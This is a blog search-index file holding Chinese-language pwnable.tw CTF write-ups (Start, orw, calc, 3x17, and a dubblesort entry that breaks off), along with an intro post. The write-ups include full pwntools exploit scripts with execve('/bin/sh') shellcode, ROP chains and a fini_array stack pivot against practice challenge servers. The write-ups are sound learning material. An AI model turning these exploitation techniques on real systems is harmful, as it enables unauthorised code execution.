<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Start</title>
    <url>/archives/5eb87a8b.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先checksec，得到32位程序且保护全关</p>
<p><img src="https://i.loli.net/2021/07/10/qIBS1ro3nxzEvZY.png"></p>
<p>扔进ida看看，程序流程很简单，输出一段话，然后请求一次输入，最多输入3c个字符</p>
<p><img src="https://i.loli.net/2021/07/10/7tmIOrjiMQv9e5o.png"></p>
<p>很明显的栈溢出</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以发现read的时候ecx没有变过，也就是读到<code>“Let&#39;s start the CTF:”</code>的位置，也即esp的位置，</p>
<p>而在程序末尾看到 <code> add esp, 14h</code> ，可知padding是0x14</p>
<p>那么思路就是在栈上布置shellcode，然后返回地址覆盖shellcode的地址</p>
<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>我们还有<code>write</code>函数，可以先栈溢出，再调用一次<code>write</code>，就能泄露栈地址</p>
<p>（在<code>retaddr</code>后面正好是程序开头<code>push</code>进去的栈上的地址，再调用write就会把这个地址打印出来）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有了栈地址之后，直接ret2shellcode就行了</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./start&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call here</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">here:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov al, 0xb</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br><span class="line">r.send(payload)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(stack+<span class="number">0x14</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>stackoverflow</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>Why begins?</title>
    <url>/archives/84551bc4.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>可在下方评论，或者以各种方式联系我</p>
<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
      <categories>
        <category>杂</category>
      </categories>
  </entry>
  <entry>
    <title>orw</title>
    <url>/archives/6fa2aae4.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw - orw"></a>pwnable.tw - orw</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>丢进ida可以发现有个orw_seccomp函数，于是用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看限制：</p>
<p><img src="https://i.loli.net/2021/07/10/WnQ5zPIfiR8gujA.png"></p>
<p>只能用open，read，write。</p>
<p>已知flag在<code>/home/orw/flag</code>，那只需要open它，read它，再write到标准输出就行</p>
<p>并且这个程序流程就是输入shellcode并运行，那直接构造shellcode就行</p>
<p>值得注意的点： 函数的返回值在eax中，在read的时候先把eax给ebx，再改为read的系统调用号</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call op</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">op:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov edx,0xff</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendafter(<span class="string">&quot;shellcode:&quot;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>calc</title>
    <url>/archives/5c3132af.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-calc"><a href="#pwnable-tw-calc" class="headerlink" title="pwnable.tw - calc"></a>pwnable.tw - calc</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看下保护，</p>
<p><img src="https://i.loli.net/2021/07/12/oZBfPkaNpDIg92F.png"></p>
<p>丢进ida分析程序，粗略看就是实现了一个简单计算器的功能，不支持括号</p>
<h3 id="看一下calc-函数"><a href="#看一下calc-函数" class="headerlink" title="看一下calc()函数"></a>看一下calc()函数</h3><p><img src="https://i.loli.net/2021/07/12/4lJ17y5uWGme9cK.png"></p>
<p>先是把expr置零，并用<code>get_expr()</code>输入进来，看代码可知这个函数过滤了除数字以及+-*/%之外的字符，到<code>0x0a</code>即<code>&#39;\n&#39;</code>结束</p>
<p><img src="https://i.loli.net/2021/07/12/LiVcjf51ykS2Nxu.png"></p>
<p>然后将一个ans数组置零，parse_expr()显然就是实现计算器功能的函数，顺便看到他输出的结果是<code>ans[ans[0]]</code>，这里提醒我们要注意<code>ans[0]</code>的内容</p>
<h3 id="分析parse-expr"><a href="#分析parse-expr" class="headerlink" title="分析parse_expr()"></a>分析<code>parse_expr()</code></h3><p>实现方法很常规，就是把运算符和操作数分离，然后再运算</p>
<h4 id="先看分离的过程"><a href="#先看分离的过程" class="headerlink" title="先看分离的过程"></a>先看分离的过程</h4><p>它维护了两个数组，一个op_buf[100]存了运算符，另一个是calc()调用的时候传进来的ans</p>
<p><img src="https://i.loli.net/2021/07/12/UgxBH9nfeuRl2LW.png"></p>
<p>首先，函数进一个大循环，</p>
<p><strong>如果当前位置是数字</strong>，就什么都不做，进入下一轮循环</p>
<p><strong>如果是运算符</strong>，（注意到有一个<code>unsigned int</code>，保证了<code>运算符-&#39;0&#39;</code>无论如何都大于9）</p>
<p>程序先把左操作数取到s1中，然后做一个判断：左操作数是否为0，若是，就报错退出（这在数学上不太合理，anyway，这是个pwn题</p>
<p>然后把左操作数转成数字，放进ans，先<code>ans[0]++</code>，然后把操作数放在<code>ans[ans[0]+1]</code>，可以猜测<code>ans[0]</code>是一个标志或者计数器</p>
<p>后面又是一个判断：后一个字符是否是运算符，若是，报错退出（就是防止类似<code>1++1</code>这种东西</p>
<h4 id="下面分析运算的部分"><a href="#下面分析运算的部分" class="headerlink" title="下面分析运算的部分"></a>下面分析运算的部分</h4><p><img src="https://i.loli.net/2021/07/12/hgqn9bZSis6xY7t.png"></p>
<p>它不会在读到第一个运算符马上运算<del>废话</del>，一是没有右操作符，二是类似<code>1+5*2</code>这种有运算优先级的问题需要处理</p>
<p>所以它是读到第二个运算符再来处理，用op_num来维护当前运算到哪个运算符，</p>
<p>至于运算的流程很简单，如果是*/%，看前面是不是+-，若是，等待下一个运算符，若不是就运算</p>
<p>运算这里有一个<code>eval()</code>函数很重要，我们来看一下：</p>
<p><img src="https://i.loli.net/2021/07/12/ciZtWpon31uMSyG.png"></p>
<p>可以看到<code>ans[ans[0]-1]</code>和<code>ans[ans[0]]</code>分别为当前运算符的左右操作数，于是<code>ans[0]</code>记录的就是最新的运算符的左操作数，也就是上一个运算符的右操作数</p>
<p>举个例子：1+2*3+4*5</p>
<p><img src="https://i.loli.net/2021/07/12/cBS2oLz4kEDWZKm.png"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="尝试0x01"><a href="#尝试0x01" class="headerlink" title="尝试0x01"></a>尝试0x01</h3><p>可以看到若有乘法的话，它之后运算完乘法的东西是不会把前面放着的加法也算掉的，而是会一直放在里面，这就让我想到能不能用类似<code>1+1*1+1*1+...+1*something_to_write</code>完成一个栈溢出并rop，但是发现输入只有0x400，但padding有0x5a0，而且还有个canary，这条路走不通</p>
<p><img src="https://i.loli.net/2021/07/12/yMlWFQBKEtN3G8D.png"></p>
<h3 id="尝试0x02"><a href="#尝试0x02" class="headerlink" title="尝试0x02"></a>尝试0x02</h3><p>开始<del>xjb乱试</del>继续分析，发现<code>+1</code>，<code>+1+1*1</code>等输出不正常，于是想到<code>+1</code>这种没有左操作数，手动模拟一下发现<code>+x</code>会把<code>x</code>加到<code>ans[0]</code>上去，而输出又是<code>ans[ans[0]]</code>，于是输出的就变成了<code>ans[x]</code>啊哈，我们有了栈上任意地址读！</p>
<p>但这还不够，手动模拟<code>+x+y</code>发现这个式子会把<code>ans[x]+y</code>，那么我们可以先打印一个地址的内容，然后算出要写的内容和它的差y，于是就有了栈上任意地址写！</p>
<p>看到<code>ans</code>在<code>ebp-0x5a0</code>的位置，而<code>ans</code>是<code>int</code>，所以得到<code>ans[360]</code>就是<code>ebp</code>，<code>ans[361]</code>就是<code>retaddr</code>，尝试一下修改：</p>
<p><img src="https://i.loli.net/2021/07/12/leixOUpJSHAG6TM.png"></p>
<p>Perfect！</p>
<p>这样也不用管canary了，因为根本不会遇到它</p>
<p>下面就是构造rop链并布置到栈上，注意到这个程序是静态链接的，直接用<code>ROPgadget --binary ./calc --ropchain</code>得到（懒人必备</p>
<img src="https://i.loli.net/2021/07/12/itsC5HBI3SlahOK.png" style="zoom:75%;" />

<p><strong>注意：</strong>因为程序输出是按int输出，会自动把小端表示倒回来，所以写入<code>&quot;/bin&quot;,&quot;//sh&quot;</code>的时候要倒着写</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./calc&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span>(<span class="params">i,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(<span class="number">361</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    orginal = <span class="built_in">int</span>(r.recv().strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    dis = addr - orginal</span><br><span class="line">    <span class="keyword">if</span> dis &gt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dis)</span><br><span class="line">    <span class="keyword">elif</span> dis &lt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(-dis)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    r.sendline(payload2)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">rop_chain = [<span class="number">0x080701aa</span>,<span class="number">0x080ec060</span>,<span class="number">0x0805c34b</span>,<span class="number">0x6e69622f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec064</span>,<span class="number">0x0805c34b</span>,<span class="number">0x68732f2f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080481d1</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701d1</span>,<span class="number">0x080ec068</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x08049a21</span>]</span><br><span class="line"><span class="comment"># \bin\\sh 要倒过来写！！！！！！！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_chain)):</span><br><span class="line">    modify(i,rop_chain[i])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;give me shell&quot;</span>) <span class="comment">#随便输入不是运算符和数字的字符串，就会从calc()返回，触发ropchain</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://www.tuicool.com/articles/VNzqea3">https://www.tuicool.com/articles/VNzqea3</a></p>
<p><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/">https://n0va-scy.github.io/2019/07/03/pwnable.tw/</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>reverse</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>3x17</title>
    <url>/archives/e7d81306.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-3x17"><a href="#pwnable-tw-3x17" class="headerlink" title="pwnable.tw - 3x17"></a>pwnable.tw - 3x17</h2><span id="more"></span>

<hr>
<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>先看下保护：</p>
<p><img src="https://i.loli.net/2021/07/13/GqM1HIzvYx6mfb3.png"></p>
<p>在试下交互，感觉是一次任意地址写</p>
<p>有了初步的概念后，丢进ida，似乎没有符号表，ida啥函数都分析不出来</p>
<p>那就得先找<code>main</code>函数，这里需要了解<code>_start</code>函数的结构，当调用<code>__libc_start_main</code>时，<code>rdi</code>中的参数即为<code>main</code>函数</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="https://i.loli.net/2021/07/13/W9NZL67k3uaYf5R.png"></div><div class="group-picture-column"><img src="https://i.loli.net/2021/07/13/PDYZNmvScyJezfC.png"></div></div></div>

<p>随便编译一个带符号表的程序，放进ida对比，可以大概对上</p>
<p>我们又知道64位程序前六个参数依次存在RDI, RSI, RDX, RCX, R8和R9寄存器中，并且</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型</span></span><br><span class="line"><span class="keyword">int</span> __libc_start_main(<span class="keyword">int</span> *(main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *), <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av, </span><br><span class="line"><span class="keyword">void</span> (*init) (<span class="keyword">void</span>), <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (* stack_end)); </span><br></pre></td></tr></table></figure>

<p>这样我们就找到了main函数，可用快捷键n改写函数名字</p>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看main函数</p>
<img src="https://i.loli.net/2021/07/13/Y3fcMVLKo6xJgSb.png" style="zoom:80%;" />

<p>myread，mywrite很好看出来，所以程序流程很简单，就是一次任意地址写，最多写0x18个字符</p>
<p>注意：</p>
<ul>
<li>当<code>byte_4B9330</code>等于1的时候，才能任意地址写，每次程序开头这个东西自增（不知道啥意思先放着</li>
<li>读进来的addr，会被一个<code>sub_40EE70</code>函数由字符串转成数字（调试一下就能发现</li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一次写变多次写"><a href="#一次写变多次写" class="headerlink" title="一次写变多次写"></a>一次写变多次写</h3><h4 id="main-启动过程"><a href="#main-启动过程" class="headerlink" title="main()启动过程"></a>main()启动过程</h4><p>具体可以看<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">这篇的3.1.1</a>，里面讲的很详细，如果不是很明白可以拿着之前那个有符号表的程序对照着看</p>
<p>这里直接给结论，程序流程是：</p>
<ul>
<li>__libc_csu_init<ul>
<li>_init</li>
<li>_init_array[0]</li>
<li>_init_array[1]</li>
<li>…</li>
<li>_init_array[n]</li>
</ul>
</li>
<li>main</li>
<li>__libc_csu_fini<ul>
<li>_fini_array[n]</li>
<li>…</li>
<li>_fini_array[1]</li>
<li>_fini_array[0]</li>
<li>_fini</li>
</ul>
</li>
</ul>
<h4 id="劫持rip"><a href="#劫持rip" class="headerlink" title="劫持rip"></a>劫持rip</h4><p>我们看一下这道题的<code>__libc_csu_fini</code></p>
<img src="https://i.loli.net/2021/07/13/kefS8Eg69KY2GaH.png" style="zoom: 80%;" />

<p>对照f5生成的伪代码，可以判断<code>off_4B40F0</code>就是<code>_fini_array</code>的头地址，点进去看看</p>
<p><img src="https://i.loli.net/2021/07/13/Mtv9dbQlYPsfG6S.png"></p>
<p>也可以在ida的subview-&gt;segements窗口找到_fini_array</p>
<img src="https://i.loli.net/2021/07/13/gZBkhJoO4eF8dnT.png" style="zoom:80%;" />

<p>可以看到有两个函数，那么函数的流程就是</p>
<pre class="mermaid">
graph LR
A(main) --&gt;B(__libc_csu_fini)
B --&gt;C(&quot;_fini_array[1]&quot;)
C --&gt; D(&quot;_fini_array[0]&quot;)
</pre>

<p>那么我们只需要覆盖这三个中随便哪个就能劫持rip了，看看有没有后门，搜”/bin/sh”无果，one_gadget无果（看来没那么简单</p>
<p>所以我们退一步，只要将<code>_fini_array[1]</code>覆盖成<code>main</code>，<code>_fini_array[0]</code>覆盖成<code>__libc_csu_fini</code>，程序流程就变成这样</p>
<pre class="mermaid">
graph LR
 
A(main) --&gt;B(__libc_csu_fini)
B --&gt; C(&quot;_fini_array[1]: main&quot;)
C --&gt; D(&quot;_fini_array[0]:__libc_csu_fini&quot;)
D --&gt; C
</pre>

<p>似乎就可以无限循环main函数了，但还有个<code>byte_4B9330==1</code>的条件，观察一下这个变量，发现是个八位的整型，那反正会不断加，总会溢出到1的，于是我们就有了<strong>多次任意地址写</strong></p>
<h4 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./3x17&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line"></span><br><span class="line">write(fini_array,p64(fini_addr)+p64(main_addr)) <span class="comment">#这里顺序要注意</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行成功</p>
<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>我们现在有了多次任意地址写，但栈上不可执行，所以没法直接shellcode，又不知道栈地址，不好rop</p>
<p>所以想到劫持rsp到我们知道的地方，然后布置好那里的内容，就可以rop了</p>
<p>继续观察<code>__libc_csu_fini</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000402961 lea     rax, unk_4B4100 ; Load Effective Address</span><br><span class="line">.text:0000000000402968 lea     rbp, off_4B40F0 ; Load Effective Address</span><br></pre></td></tr></table></figure>

<p>可以发现这里把rbp当成普通寄存器存了<code>_fini_array</code>的头地址</p>
<p>然后后面就开始调用了_fini_array，之后的流程是我们可控的，于是就想到利用rbp中的内容改rsp</p>
<p>main函数末尾是<code>leave; retn;</code>，相当于<code>mov rsp, rbp; pop rbp; ret;</code>，于是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     rbp, off_4B40F0 ; rbp = 0x4b40f0            , rsp = 未知</span><br><span class="line"></span><br><span class="line">; 劫持到这</span><br><span class="line">mov     rsp,rbp         ; rbp = 0x4b40f0            , rsp = 0x4b40f0</span><br><span class="line">pop     rbp             ; rbp = [rsp] = [0x4b40f0]  , rsp = 0x4b40f8</span><br><span class="line">ret                     ; rip = [rsp] = [0x4b40f8]  , rsp = 0x4b4100</span><br></pre></td></tr></table></figure>

<p>这样的话，rbp指向<code>_fini_array[0]</code>，rip指向<code>_fini_array[1]</code>，rsp被劫持到<code>0x4b4100</code></p>
<p>那么我们现在需要保证<code>_fini_array[1</code> 不会改变栈上高地址的内容，而我们前面已经将这里改成了main函数，不动它就行了</p>
<p>只要我们将<code>_fini_array[0]</code>覆盖成<code>leave; retn;</code>的地址，就会中断循环，并进入main函数，而这时候不满足<code>byte_4B9330==1</code>，会立即return，触发rop</p>
<p>我们要做的事情：</p>
<ol>
<li>在<code>0x4b4100</code>后面布置ropchain（用ROPgadget，”/bin/sh\x00”随便找个高地址放着</li>
<li>将<code>_fini_array[0]</code>覆盖成<code>leave; retn;</code>的地址</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./3x17&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    r.recv()</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line">bss = <span class="number">0x4b4100</span></span><br><span class="line">lev_ret = <span class="number">0x401C4B</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401696</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x406c30</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x446e35</span></span><br><span class="line">syscall = <span class="number">0x4022b4</span></span><br><span class="line">binsh_addr = <span class="number">0x4b4300</span></span><br><span class="line"></span><br><span class="line">write(fini_array,p64(fini_addr)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">write(binsh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">write(bss,p64(pop_rax_ret)+p64(<span class="number">0x3b</span>))</span><br><span class="line">write(bss+<span class="number">0x10</span>,p64(pop_rdi_ret)+p64(binsh_addr))</span><br><span class="line">write(bss+<span class="number">0x20</span>,p64(pop_rsi_ret)+p64(<span class="number">0</span>))</span><br><span class="line">write(bss+<span class="number">0x30</span>,p64(pop_rdx_ret)+p64(<span class="number">0</span>))</span><br><span class="line">write(bss+<span class="number">0x40</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(lev_ret))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>exp中的write函数中：</p>
<ul>
<li>传addr的时候sendline和send都行</li>
<li>传data的时候sendline不行，send就行</li>
</ul>
<p>不是很明白为什么，如果有人知道，希望能教我一下(*^▽^*)</p>
<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/</a></p>
<p><a href="https://v1ckydxp.github.io/2019/04/26/pwnable-tw-3x17-writeup/">https://v1ckydxp.github.io/2019/04/26/pwnable-tw-3x17-writeup/</a></p>
<p><a href="https://blog.csdn.net/qq_43189757/article/details/102736227">https://blog.csdn.net/qq_43189757/article/details/102736227</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>rop</tag>
        <tag>栈迁移</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>dubblesort</title>
    <url>/archives/51d1aace.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-dubblesort"><a href="#pwnable-tw-dubblesort" class="headerlink" title="pwnable.tw - dubblesort"></a>pwnable.tw - dubblesort</h2><span id="more"></span>

<hr>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看保护，好家伙，保护全开</p>
<p><img src="https://i.loli.net/2021/07/13/v7OlDzmIHKnYR23.png"></p>
<p>看看程序流程，大概就是输入个名字，然后输入一堆数，冒泡排序后输出</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p><img src="https://i.loli.net/2021/07/13/OgABFh6tqYMckDK.png"></p>
<p>输了几次名字，发现会有段乱码，丢进ida看看，果然输出名字的地方有问题</p>
<p>他是read输入的，不会在末尾加上<code>\x00</code>截断，又用printf输出，还用了<code>%s</code>，那栈上东西就好泄露了；加上题目给了libc文件，大概就是个ret2libc吧</p>
<p>用gdb调一下，看看栈上有什么东西可以泄露</p>
<blockquote>
<p>对于开了pie保护的程序，可以用<code>b *$rebase(your_addr)</code>来下断点</p>
</blockquote>
